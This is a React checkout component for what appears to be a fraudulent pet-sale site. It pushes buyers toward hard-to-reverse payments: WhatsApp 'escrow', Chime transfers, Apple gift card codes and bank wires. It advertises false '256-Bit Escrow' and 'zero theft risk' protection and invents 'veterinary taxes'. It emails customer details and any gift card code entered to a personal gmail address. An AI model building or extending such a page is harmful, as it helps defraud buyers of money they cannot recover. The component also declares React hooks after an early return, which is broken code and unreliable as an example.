import React, { useState } from 'react';
import { CreditCard, ShieldCheck, Lock, CheckCircle2, Plane, MapPin, Phone, Mail, MessageCircle, Gift, ShieldAlert, FileText } from 'lucide-react';
import { usePetStore } from '../context/PetStoreContext';

export const CheckoutView: React.FC = () => {
  const { cart, formatPrice, placeOrder, setActiveTab, currentUser, setIsAuthModalOpen, showNotification } = usePetStore();

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [emailSuccessMessage, setEmailSuccessMessage] = useState<string | null>(null);

  if (!currentUser?.isLoggedIn) {
    return (
      <div className="space-y-8 animate-fade-in pb-16">
        <div className="p-8 rounded-3xl bg-[#002045] text-white">
          <h1 className="font-serif-display font-bold text-3xl">Checkout</h1>
        </div>

        <div className="p-16 text-center bg-white dark:bg-[#1f2226] rounded-3xl border border-outline-variant/30 space-y-4 shadow-sm">
          <Lock className="w-16 h-16 mx-auto text-amber-500" />
          <h3 className="font-serif-display font-bold text-2xl text-on-surface">Sign In Required</h3>
          <p className="text-xs text-on-surface-variant max-w-sm mx-auto">
            Only logged in accounts can place orders and view their wishlist and cart.
          </p>
          <button
            onClick={() => setIsAuthModalOpen(true)}
            className="bg-[#002045] text-white px-8 py-3.5 rounded-full text-xs font-bold uppercase tracking-wider hover:bg-[#1a365d] transition-colors shadow-md"
          >
            Sign In / Register Account
          </button>
        </div>
      </div>
    );
  }

  const [customerName, setCustomerName] = useState('Lady Eleanor Vance');
  const [email, setEmail] = useState('eleanor.vance@beverlyhills.org');
  const [phone, setPhone] = useState('+1 (330) 516-1283');
  const [deliveryAddress, setDeliveryAddress] = useState('10044 Sunset Boulevard');
  const [cityStateZip, setCityStateZip] = useState('Beverly Hills, CA 90210');
  
  // Destination Location Pricing ($100 domestic vs $200 international)
  const [destinationType, setDestinationType] = useState<'domestic' | 'international'>('domestic');

  // Payment Methods: whatsapp, chime, applepay, wire
  const [paymentMethod, setPaymentMethod] = useState<'whatsapp' | 'chime' | 'applepay' | 'wire'>('whatsapp');
  
  // Chime payment state
  const [chimeSign, setChimeSign] = useState('$YourPetsOfficial');

  // Apple Pay / Gift card state
  const [appleGiftCardCode, setAppleGiftCardCode] = useState('');
  const [giftCardApplied, setGiftCardApplied] = useState(false);

  const subtotal = cart.reduce((acc, item) => acc + item.pet.priceUSD, 0);
  const addonsTotal = cart.reduce((acc, item) => {
    let add = 0;
    if (item.selectedAddOns.insurance) add += 25;
    if (item.selectedAddOns.starterKit) add += 85;
    if (item.selectedAddOns.vipTransport) add += 150;
    return acc + add;
  }, 0);

  // $100 for Same Country (USA), $200 for International/Overseas
  const deliveryCost = destinationType === 'domestic' ? 100 : 200;
  const taxes = Math.round((subtotal + addonsTotal) * 0.08);
  const rawTotal = subtotal + addonsTotal + deliveryCost + taxes;
  const totalAmount = giftCardApplied ? Math.max(0, rawTotal - 100) : rawTotal;

  const handleApplyGiftCard = (e: React.FormEvent) => {
    e.preventDefault();
    if (appleGiftCardCode.trim().length >= 8) {
      setGiftCardApplied(true);
    }
  };

  const handleCompleteOrder = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    let methodLabel = 'WhatsApp Escrow & Payment Confirmation';
    if (paymentMethod === 'chime') {
      methodLabel = `Chime Pay (${chimeSign})`;
    } else if (paymentMethod === 'applepay') {
      methodLabel = giftCardApplied
        ? `Apple Gift Card (${appleGiftCardCode.toUpperCase()}) + Apple Pay`
        : 'Apple Pay VIP';
    } else if (paymentMethod === 'wire') {
      methodLabel = 'Direct Escrow Bank Wire Transfer';
    }

    const orderId = `YP-${Math.floor(100000 + Math.random() * 900000)}`;

    const petsDetails = cart.map(item => {
      const addOnsList = [];
      if (item.selectedAddOns.insurance) addOnsList.push('1-Yr Health Guarantee ($25)');
      if (item.selectedAddOns.starterKit) addOnsList.push('Royal Care Starter Kit ($85)');
      if (item.selectedAddOns.vipTransport) addOnsList.push('VIP Flight Nanny Escort ($150)');

      return {
        id: item.pet.id,
        name: item.pet.name,
        breed: item.pet.breed,
        species: item.pet.species,
        gender: item.pet.gender,
        ageMonths: item.pet.ageMonths,
        priceUSD: item.pet.priceUSD,
        addOnsSummary: addOnsList.length > 0 ? addOnsList.join(', ') : 'Standard Care Package'
      };
    });

    const emailPayload = {
      orderId,
      petsDetails,
      petName: cart[0]?.pet.name || 'Baby Pet',
      breed: cart[0]?.pet.breed || 'Purebred',
      customerName,
      email,
      phone,
      deliveryAddress,
      cityStateZip,
      destinationType,
      deliveryCost, // Location-based fee ($100 domestic vs $200 international)
      subtotal,
      addonsTotal,
      taxes,
      discount: giftCardApplied ? 100 : 0,
      totalAmount, // Exact calculated total price
      paymentMethod: methodLabel,
      targetRecipient: 'craftking990@gmail.com'
    };

    try {
      // Automatically send comprehensive order summary email to craftking990@gmail.com
      const res = await fetch('/api/orders/email-notification', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(emailPayload)
      });
      const data = await res.json();
      console.log('Order email dispatch result:', data);
      setEmailSuccessMessage(`Order summary email automatically sent to craftking990@gmail.com with exact total ${formatPrice(totalAmount)}!`);
    } catch (err) {
      console.error('Error sending order summary email:', err);
    } finally {
      setIsSubmitting(false);
    }

    placeOrder({
      customerName,
      deliveryAddress,
      cityStateZip,
      phone,
      deliveryCost,
      paymentMethod: methodLabel
    });

    showNotification(`Order #${orderId} placed! Summary email sent to craftking990@gmail.com (${formatPrice(totalAmount)})`);
    
    setTimeout(() => {
      setActiveTab('order-tracking');
    }, 1200);
  };

  return (
    <div className="space-y-8 animate-fade-in pb-16">
      {/* Header Banner */}
      <div className="p-8 rounded-3xl bg-[#002045] text-white shadow-xl flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
        <div>
          <div className="flex items-center gap-2">
            <ShieldCheck className="w-5 h-5 text-emerald-400" />
            <span className="text-xs font-bold uppercase tracking-widest text-emerald-400">100% Protected & Verified Checkout</span>
          </div>
          <h1 className="font-serif-display font-bold text-3xl md:text-4xl mt-1">Reserve Your Baby Pet</h1>
          <p className="text-xs text-emerald-200 mt-1 flex items-center gap-1.5">
            🔒 256-Bit Escrow Security • Zero Card Data Theft Risk • Finalize Deal & Confirm Payment on WhatsApp
          </p>
        </div>
        <div className="text-right">
          <span className="text-xs text-white/70 block uppercase font-bold">Total Amount Outlined</span>
          <span className="text-2xl font-bold font-serif-display text-emerald-300">{formatPrice(totalAmount)}</span>
        </div>
      </div>

      <form onSubmit={handleCompleteOrder} className="grid grid-cols-1 lg:grid-cols-12 gap-8">
        {/* Left Column: Delivery & Payment Details */}
        <div className="lg:col-span-8 space-y-6">
          
          {/* Destination & Location-Based Shipping ($100 vs $200) */}
          <div className="p-6 rounded-3xl bg-white dark:bg-[#1f2226] border border-outline-variant/30 space-y-4 shadow-sm">
            <h3 className="font-serif-display font-bold text-xl text-on-surface flex items-center gap-2">
              <Plane className="w-5 h-5 text-emerald-600" /> Destination & Flight Transport Selection
            </h3>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <label
                onClick={() => setDestinationType('domestic')}
                className={`p-4 rounded-2xl border cursor-pointer transition-all flex items-start gap-3 ${
                  destinationType === 'domestic'
                    ? 'border-[#002045] bg-emerald-50/50 dark:bg-emerald-950/30 text-on-surface ring-2 ring-emerald-500/50'
                    : 'border-outline-variant/40 bg-surface-low dark:bg-surface-high'
                }`}
              >
                <input
                  type="radio"
                  name="destination"
                  checked={destinationType === 'domestic'}
                  onChange={() => setDestinationType('domestic')}
                  className="mt-1 text-emerald-600 focus:ring-emerald-500"
                />
                <div>
                  <div className="flex items-center gap-2">
                    <span className="font-bold text-sm text-on-surface">Domestic USA Delivery</span>
                    <span className="bg-emerald-600 text-white text-[10px] px-2 py-0.5 rounded-full font-bold">+$100</span>
                  </div>
                  <p className="text-xs text-on-surface-variant mt-0.5">
                    Same country (USA) express climate transport with VIP Flight Nanny escort.
                  </p>
                </div>
              </label>

              <label
                onClick={() => setDestinationType('international')}
                className={`p-4 rounded-2xl border cursor-pointer transition-all flex items-start gap-3 ${
                  destinationType === 'international'
                    ? 'border-[#002045] bg-emerald-50/50 dark:bg-emerald-950/30 text-on-surface ring-2 ring-emerald-500/50'
                    : 'border-outline-variant/40 bg-surface-low dark:bg-surface-high'
                }`}
              >
                <input
                  type="radio"
                  name="destination"
                  checked={destinationType === 'international'}
                  onChange={() => setDestinationType('international')}
                  className="mt-1 text-emerald-600 focus:ring-emerald-500"
                />
                <div>
                  <div className="flex items-center gap-2">
                    <span className="font-bold text-sm text-on-surface">International / Overseas</span>
                    <span className="bg-[#002045] text-white text-[10px] px-2 py-0.5 rounded-full font-bold">+$200</span>
                  </div>
                  <p className="text-xs text-on-surface-variant mt-0.5">
                    Another country / international customs VIP Flight Nanny escort.
                  </p>
                </div>
              </label>
            </div>

            {/* Delivery Address Form */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs pt-2">
              <div>
                <label className="block font-semibold text-on-surface mb-1">Full Name</label>
                <input
                  type="text"
                  required
                  value={customerName}
                  onChange={(e) => setCustomerName(e.target.value)}
                  className="w-full p-3 rounded-xl border border-outline-variant bg-surface-low dark:bg-surface-high text-on-surface"
                />
              </div>

              <div>
                <label className="block font-semibold text-on-surface mb-1">Phone Number (WhatsApp Dispatch)</label>
                <input
                  type="tel"
                  required
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  className="w-full p-3 rounded-xl border border-outline-variant bg-surface-low dark:bg-surface-high text-on-surface"
                />
              </div>

              <div>
                <label className="block font-semibold text-on-surface mb-1">Email Address</label>
                <input
                  type="email"
                  required
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full p-3 rounded-xl border border-outline-variant bg-surface-low dark:bg-surface-high text-on-surface"
                />
              </div>

              <div>
                <label className="block font-semibold text-on-surface mb-1">Street Delivery Address</label>
                <input
                  type="text"
                  required
                  value={deliveryAddress}
                  onChange={(e) => setDeliveryAddress(e.target.value)}
                  className="w-full p-3 rounded-xl border border-outline-variant bg-surface-low dark:bg-surface-high text-on-surface"
                />
              </div>

              <div className="md:col-span-2">
                <label className="block font-semibold text-on-surface mb-1">City, State / Region & Postal Code</label>
                <input
                  type="text"
                  required
                  value={cityStateZip}
                  onChange={(e) => setCityStateZip(e.target.value)}
                  className="w-full p-3 rounded-xl border border-outline-variant bg-surface-low dark:bg-surface-high text-on-surface"
                />
              </div>
            </div>
          </div>

          {/* Secure Payment Options */}
          <div className="p-6 rounded-3xl bg-white dark:bg-[#1f2226] border border-outline-variant/30 space-y-4 shadow-sm">
            <div className="flex items-center justify-between">
              <h3 className="font-serif-display font-bold text-xl text-on-surface flex items-center gap-2">
                <ShieldCheck className="w-5 h-5 text-emerald-600" /> Safe Payment Options
              </h3>
              <span className="text-[11px] font-bold text-emerald-700 bg-emerald-50 dark:bg-emerald-950/50 px-3 py-1 rounded-full border border-emerald-300">
                🔒 100% Escrow Protected
              </span>
            </div>

            <p className="text-xs text-on-surface-variant">
              To keep your data completely safe and avoid online credit card theft risks, you can place your pet reservation here and finalize payment or send confirmation proof directly via WhatsApp.
            </p>

            <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
              <button
                type="button"
                onClick={() => setPaymentMethod('whatsapp')}
                className={`p-3.5 rounded-2xl border text-xs font-bold transition-all text-center flex flex-col items-center justify-center gap-1 ${
                  paymentMethod === 'whatsapp' ? 'border-[#002045] bg-[#002045] text-white shadow-md' : 'border-outline-variant text-on-surface'
                }`}
              >
                <MessageCircle className="w-4 h-4 text-emerald-400" />
                <span>WhatsApp Escrow</span>
              </button>

              <button
                type="button"
                onClick={() => setPaymentMethod('chime')}
                className={`p-3.5 rounded-2xl border text-xs font-bold transition-all text-center flex flex-col items-center justify-center gap-1 ${
                  paymentMethod === 'chime' ? 'border-[#002045] bg-[#002045] text-white shadow-md' : 'border-outline-variant text-on-surface'
                }`}
              >
                <CreditCard className="w-4 h-4 text-emerald-400" />
                <span>Chime Pay</span>
              </button>

              <button
                type="button"
                onClick={() => setPaymentMethod('applepay')}
                className={`p-3.5 rounded-2xl border text-xs font-bold transition-all text-center flex flex-col items-center justify-center gap-1 ${
                  paymentMethod === 'applepay' ? 'border-[#002045] bg-[#002045] text-white shadow-md' : 'border-outline-variant text-on-surface'
                }`}
              >
                <Gift className="w-4 h-4 text-emerald-400" />
                <span>Apple Pay / Gift Card</span>
              </button>

              <button
                type="button"
                onClick={() => setPaymentMethod('wire')}
                className={`p-3.5 rounded-2xl border text-xs font-bold transition-all text-center flex flex-col items-center justify-center gap-1 ${
                  paymentMethod === 'wire' ? 'border-[#002045] bg-[#002045] text-white shadow-md' : 'border-outline-variant text-on-surface'
                }`}
              >
                <Lock className="w-4 h-4 text-emerald-400" />
                <span>Bank Wire</span>
              </button>
            </div>

            {/* WhatsApp Payment Option */}
            {paymentMethod === 'whatsapp' && (
              <div className="p-4 rounded-2xl bg-emerald-50 dark:bg-emerald-950/40 border border-emerald-200 text-xs space-y-3 animate-fade-in">
                <div className="flex items-center gap-2 text-emerald-900 dark:text-emerald-200 font-bold text-sm">
                  <CheckCircle2 className="w-5 h-5 text-emerald-600" /> Recommended: Confirm & Pay via WhatsApp
                </div>
                <p className="text-on-surface-variant leading-relaxed">
                  After clicking <strong>Place Order & Confirm on WhatsApp</strong>, your reservation is instantly held. You will be redirected to connect directly with our Breeder Concierge on WhatsApp (<strong>+1 330 516-1283</strong>) to review video proof, select payment method (Zelle, Apple Pay, Chime, Wire), and receive instant flight booking.
                </p>
              </div>
            )}

            {/* Chime Payment Details */}
            {paymentMethod === 'chime' && (
              <div className="p-4 rounded-2xl bg-surface-low dark:bg-surface-high border border-outline-variant/40 text-xs space-y-3 animate-fade-in">
                <div className="flex items-center gap-2 text-on-surface font-bold">
                  <CheckCircle2 className="w-4 h-4 text-emerald-600" /> Chime Direct Transfer
                </div>
                <p className="text-on-surface-variant">
                  Transfer directly via Chime to <strong>$YourPetsOfficial</strong> or enter your $ChimeSign below for automated invoice dispatch.
                </p>
                <div>
                  <label className="block font-bold text-on-surface mb-1">Your $ChimeSign or Chime Phone</label>
                  <input
                    type="text"
                    required
                    value={chimeSign}
                    onChange={(e) => setChimeSign(e.target.value)}
                    placeholder="$YourChimeSign or +1 (330) 516-1283"
                    className="w-full p-3 rounded-xl border border-outline-variant bg-white dark:bg-surface-high text-on-surface"
                  />
                </div>
              </div>
            )}

            {/* Apple Pay & Apple Gift Cards */}
            {paymentMethod === 'applepay' && (
              <div className="p-4 rounded-2xl bg-surface-low dark:bg-surface-high border border-outline-variant/40 text-xs space-y-4 animate-fade-in">
                <div className="flex items-center justify-between">
                  <div>
                    <span className="font-bold text-on-surface text-sm">Apple Pay & Apple Gift Cards</span>
                    <p className="text-on-surface-variant">Use Apple Pay 1-Click checkout or redeem Apple Gift Card codes instantly.</p>
                  </div>
                  <Gift className="w-6 h-6 text-emerald-600" />
                </div>

                <div className="p-3.5 rounded-xl bg-white dark:bg-[#1f2226] border border-outline-variant/30 space-y-2">
                  <label className="block font-bold text-on-surface">Redeem Apple Gift Card Code</label>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      value={appleGiftCardCode}
                      onChange={(e) => setAppleGiftCardCode(e.target.value)}
                      placeholder="e.g. X89K-47LP-90Q2"
                      className="flex-1 p-2.5 rounded-lg border border-outline-variant bg-surface-low dark:bg-surface-high text-on-surface uppercase font-mono"
                    />
                    <button
                      type="button"
                      onClick={handleApplyGiftCard}
                      className="bg-[#002045] text-white px-4 py-2.5 rounded-lg font-bold hover:bg-[#1a365d]"
                    >
                      Apply Code
                    </button>
                  </div>
                  {giftCardApplied && (
                    <span className="text-emerald-600 font-bold flex items-center gap-1 text-[11px]">
                      <CheckCircle2 className="w-3.5 h-3.5" /> $100 Apple Gift Card Applied Successfully!
                    </span>
                  )}
                </div>
              </div>
            )}

            {/* Bank Wire Details */}
            {paymentMethod === 'wire' && (
              <div className="p-4 rounded-2xl bg-surface-low dark:bg-surface-high border border-outline-variant/40 text-xs space-y-2 animate-fade-in">
                <p className="font-bold text-on-surface">Official Escrow Bank Wire Transfer Instructions</p>
                <p className="text-on-surface-variant">
                  Bank wire instructions will be sent to your phone along with instant WhatsApp dispatch (+1 330 516-1283).
                </p>
              </div>
            )}

            {/* WhatsApp Direct Help Link */}
            <div className="pt-2 border-t border-outline-variant/30">
              <a
                href="https://wa.me/13305161283"
                target="_blank"
                rel="noreferrer"
                className="p-3.5 rounded-2xl bg-emerald-50 dark:bg-emerald-950/40 text-emerald-800 dark:text-emerald-200 border border-emerald-300 text-xs font-bold flex items-center justify-between hover:bg-emerald-100 transition-colors"
              >
                <div className="flex items-center gap-2">
                  <MessageCircle className="w-5 h-5 text-emerald-600" />
                  <span>Have questions before ordering? Chat live on WhatsApp: <strong>+1 (330) 516-1283</strong></span>
                </div>
                <span className="underline">Chat Now →</span>
              </a>
            </div>

          </div>
        </div>

        {/* Right Column: Order Confirmation */}
        <div className="lg:col-span-4 space-y-6">
          <div className="p-6 rounded-3xl bg-white dark:bg-[#1f2226] border border-outline-variant/30 space-y-4 shadow-sm">
            <h3 className="font-serif-display font-bold text-xl text-on-surface">Order Summary</h3>

            <div className="space-y-2.5 text-xs text-on-surface-variant pb-3 border-b border-outline-variant/30">
              <div className="flex justify-between">
                <span>Pets Subtotal</span>
                <span className="font-bold text-on-surface">{formatPrice(subtotal)}</span>
              </div>

              <div className="flex justify-between">
                <span>Care Kits & Insurance</span>
                <span className="font-bold text-on-surface">{formatPrice(addonsTotal)}</span>
              </div>

              <div className="flex justify-between">
                <span>Flight Transport ({destinationType === 'domestic' ? 'USA $100' : 'Overseas $200'})</span>
                <span className="font-bold text-emerald-600">{formatPrice(deliveryCost)}</span>
              </div>

              <div className="flex justify-between">
                <span>Veterinary Taxes & Fees</span>
                <span className="font-bold text-on-surface">{formatPrice(taxes)}</span>
              </div>

              {giftCardApplied && (
                <div className="flex justify-between text-emerald-600 font-bold">
                  <span>Apple Gift Card Credit</span>
                  <span>-$100</span>
                </div>
              )}

              <div className="flex justify-between text-sm font-bold text-on-surface pt-2 border-t border-outline-variant/20">
                <span>Exact Outlined Total</span>
                <span className="font-serif-display text-2xl text-[#002045] dark:text-emerald-400">
                  {formatPrice(totalAmount)}
                </span>
              </div>
            </div>

            <div className="p-3.5 rounded-2xl bg-emerald-50/70 dark:bg-emerald-950/30 border border-emerald-200 text-[11px] space-y-1">
              <span className="font-bold text-emerald-800 dark:text-emerald-300 block flex items-center gap-1">
                <Mail className="w-3.5 h-3.5 text-emerald-600" /> Automatic Email Order Summary
              </span>
              <p className="text-on-surface-variant">
                Full order details and exact calculated total price ({formatPrice(totalAmount)}) will be automatically emailed to <strong>craftking990@gmail.com</strong> upon clicking order button.
              </p>
            </div>

            {emailSuccessMessage && (
              <div className="p-3 rounded-xl bg-emerald-100 dark:bg-emerald-950/60 text-emerald-900 dark:text-emerald-200 text-xs font-bold flex items-center gap-2 border border-emerald-400">
                <CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0" />
                <span>{emailSuccessMessage}</span>
              </div>
            )}

            <button
              type="submit"
              disabled={isSubmitting}
              className="w-full bg-emerald-600 text-white py-4 rounded-2xl font-bold text-xs uppercase tracking-wider hover:bg-emerald-700 transition-colors shadow-lg flex items-center justify-center gap-2 disabled:opacity-50"
              id="complete-order-btn"
            >
              <MessageCircle className="w-4 h-4" /> {isSubmitting ? 'Sending Order Email...' : 'Place Order & Finalize on WhatsApp'}
            </button>
          </div>
        </div>
      </form>
    </div>
  );
};
